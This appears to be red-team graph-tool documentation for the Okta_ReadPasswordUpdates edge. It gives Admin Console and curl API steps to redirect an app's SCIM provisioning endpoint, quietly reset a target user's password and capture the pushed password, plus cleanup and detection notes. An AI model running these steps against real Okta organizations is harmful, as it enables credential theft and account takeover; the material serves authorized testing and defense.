## General Information

The traversable Okta_ReadPasswordUpdates edges represent applications that can receive password updates from Okta over SCIM or a provisioning connector.

```mermaid
graph LR
  org("Okta_Organization contoso.okta.com")
  app("Okta_Application SCIM App")
  user("Okta_User john\@contoso.com")
  user2("Okta_User steve\@contoso.com")
  app -- Okta_ReadPasswordUpdates --> user
  user -- Okta_SuperAdmin --> org
  user2 -- Okta_AppAdmin --> app
```

## Abuse Info

An attacker who controls the source application, its provisioning endpoint, or its provisioning credentials can receive password update events for the destination user when Okta is configured to push password changes to that application. This can expose the user's new password during a reset or password-change workflow.

This edge is directly abusable when the attacker can read the existing provisioning receiver's logs or traffic. It can also be abused through an adjacent app-admin path, such as `Okta_AppAdmin` or `Okta_ManageApp`, by redirecting or modifying the app's SCIM/provisioning connection and then triggering a controlled password update for the destination user.

Using the Admin Console:

1. Gain control of the source application or an Okta admin path that can manage the source application's provisioning settings.
2. Open **Applications** > **Applications** and select the source application.
3. Review the provisioning settings and confirm password update push is enabled for the app.
4. If you control the existing provisioning endpoint, monitor the SCIM server or connector logs for password update requests.
5. If you can manage the app, temporarily point the SCIM or provisioning endpoint to controlled infrastructure, or add logging to the existing endpoint.
6. Trigger a password reset for the destination user or wait for the user to change their password.
7. Capture the password value delivered to the provisioning endpoint.
8. Authenticate as the destination user where MFA and sign-on policy allow, or reuse the password in downstream systems where applicable.

Using the Okta API:

1. Set the Okta org URL, API credential, source application ID, and destination user ID.

    ```bash
    export OKTA_ORG="https://contoso.okta.com"
    export OKTA_API_TOKEN="REDACTED"
    export SOURCE_APP_ID="0oa..."
    export TARGET_USER_ID="00u..."
    ```

2. Verify that the source application has password update push enabled. The feature list should include the password update feature used by the collector, such as `PUSH_PASSWORD_UPDATES`.

    ```bash
    curl -sS \
      -H "Authorization: SSWS $OKTA_API_TOKEN" \
      -H "Accept: application/json" \
      "$OKTA_ORG/api/v1/apps/$SOURCE_APP_ID/features" \
      | jq -r '.[] | [.name, .status] | @tsv'
    ```

3. Verify the destination user is assigned to the source application.

    ```bash
    curl -sS \
      -H "Authorization: SSWS $OKTA_API_TOKEN" \
      -H "Accept: application/json" \
      "$OKTA_ORG/api/v1/apps/$SOURCE_APP_ID/users/$TARGET_USER_ID" \
      | jq '{id, status, scope, syncState, profile}'
    ```

4. Retrieve the application's provisioning connection before making changes. Save this output so the endpoint, authentication scheme, and credentials can be restored.

    ```bash
    curl -sS \
      -H "Authorization: SSWS $OKTA_API_TOKEN" \
      -H "Accept: application/json" \
      "$OKTA_ORG/api/v1/apps/$SOURCE_APP_ID/connections/default" \
      | tee /tmp/okta-read-password-updates-connection.json \
      | jq '{status, authScheme, profile}'
    ```

5. Start or prepare a controlled SCIM/provisioning receiver. The exact receiver depends on the target application connector. The Okta SCIM Attack Tool can be used for research workflows where a controlled SCIM server is appropriate.

6. If you have permission to update the provisioning connection through API, update it using the Application Connections API with a connector-specific body that preserves required fields and points to the controlled receiver. Otherwise, make the endpoint change in the Admin Console and keep the original connection output from the previous step for cleanup.

7. Trigger a password reset for the destination user and capture the reset URL.

    ```bash
    curl -sS -X POST \
      -H "Authorization: SSWS $OKTA_API_TOKEN" \
      -H "Accept: application/json" \
      "$OKTA_ORG/api/v1/users/$TARGET_USER_ID/lifecycle/reset_password?sendEmail=false&revokeSessions=false" \
      | tee /tmp/okta-read-password-updates-reset.json

    jq -r '.resetPasswordUrl' /tmp/okta-read-password-updates-reset.json
    ```

    A successful response contains a one-time `resetPasswordUrl`. Complete the reset flow and set a known password. If password update push is enabled, Okta sends the password update to the source application's provisioning endpoint.

8. Watch the controlled endpoint or existing provisioning logs for the password update request, then attempt authentication as the destination user or continue along the user's downstream edges.

9. Verify the app-user sync state after the password update.

    ```bash
    curl -sS \
      -H "Authorization: SSWS $OKTA_API_TOKEN" \
      -H "Accept: application/json" \
      "$OKTA_ORG/api/v1/apps/$SOURCE_APP_ID/users/$TARGET_USER_ID" \
      | jq '{id, status, scope, syncState, profile}'
    ```

## Cleanup after Abuse

Cleanup for `Okta_ReadPasswordUpdates` means treating the destination user's password and the source application's provisioning connection as exposed: restore the original endpoint, rotate provisioning credentials, force a legitimate password reset, and remove captured secrets from tooling and logs.

Cleanup using Admin Console:

1. Open **Applications** > **Applications** and select the source application.
2. Restore the original SCIM or provisioning endpoint, authentication scheme, and attribute mappings.
3. Rotate the provisioning credential or bearer token used by the source application.
4. Remove captured passwords from controlled receivers, logs, shell history, and notes.
5. Force a legitimate password reset for the destination user and revoke sessions.
6. Run or wait for provisioning and verify the source application reports a healthy connection.

Cleanup using API:

1. Verify the current provisioning connection and compare it with the saved original output.

    ```bash
    curl -sS \
      -H "Authorization: SSWS $OKTA_API_TOKEN" \
      -H "Accept: application/json" \
      "$OKTA_ORG/api/v1/apps/$SOURCE_APP_ID/connections/default" \
      | jq '{status, authScheme, profile}'
    ```

2. Restore the original provisioning connection with the Application Connections API or the Admin Console. The update body is connector-specific; use the saved `/tmp/okta-read-password-updates-connection.json` as the source of truth for endpoint, auth scheme, and profile values.

3. Trigger a legitimate password reset for the destination user, send the reset to the user, and revoke active sessions.

    ```bash
    curl -i -sS -X POST \
      -H "Authorization: SSWS $OKTA_API_TOKEN" \
      -H "Accept: application/json" \
      "$OKTA_ORG/api/v1/users/$TARGET_USER_ID/lifecycle/reset_password?sendEmail=true&revokeSessions=true"
    ```

4. Revoke remaining Okta sessions and OAuth tokens for the destination user.

    ```bash
    curl -i -sS -X DELETE \
      -H "Authorization: SSWS $OKTA_API_TOKEN" \
      -H "Accept: application/json" \
      "$OKTA_ORG/api/v1/users/$TARGET_USER_ID/sessions?oauthTokens=true"
    ```

5. Trigger an app-user sync or wait for normal provisioning to verify the restored endpoint works.

    ```bash
    curl -i -sS -X POST \
      -H "Authorization: SSWS $OKTA_API_TOKEN" \
      -H "Accept: application/json" \
      "$OKTA_ORG/api/v1/apps/$SOURCE_APP_ID/users/$TARGET_USER_ID/lifecycle/sync"
    ```

6. Confirm the application user remains assigned and healthy after cleanup.

    ```bash
    curl -sS \
      -H "Authorization: SSWS $OKTA_API_TOKEN" \
      -H "Accept: application/json" \
      "$OKTA_ORG/api/v1/apps/$SOURCE_APP_ID/users/$TARGET_USER_ID" \
      | jq '{id, status, scope, syncState, profile}'
    ```

## Opsec Considerations

Relevant telemetry can include application provisioning connection changes, password reset events, user password updates, app-user sync activity, and outbound provisioning failures. Redirecting a SCIM endpoint can break legitimate provisioning and is likely to be noticed quickly if the application is actively used.

Password resets for privileged users are high-signal events. If the source application starts receiving password updates from a new endpoint, source IP, or credential shortly before a privileged login, defenders can correlate the reset, provisioning event, and subsequent authentication.

## References

- [Okta Application Features API](https://developer.okta.com/docs/api/openapi/okta-management/management/tag/ApplicationFeatures/)
- [Okta Application Connections API](https://developer.okta.com/docs/api/openapi/okta-management/management/tag/ApplicationConnections/)
- [Okta Application Users API](https://developer.okta.com/docs/api/openapi/okta-management/management/tag/ApplicationUsers/)
- [Okta User Lifecycle API](https://developer.okta.com/docs/api/openapi/okta-management/management/tag/UserLifecycle/)
- [Okta User Sessions API](https://developer.okta.com/docs/api/openapi/okta-management/management/tag/UserSessions/)
- [Okta SCIM concepts](https://developer.okta.com/docs/concepts/scim/)
- [Okta System Log event types](https://developer.okta.com/docs/reference/api/event-types/)
- [AppOmni: Okta PassBleed Risks](https://appomni.com/ao-labs/okta-passbleed-risks/)
- [Okta SCIM Attack Tool](https://github.com/authomize/okta_scim_attack_tool)
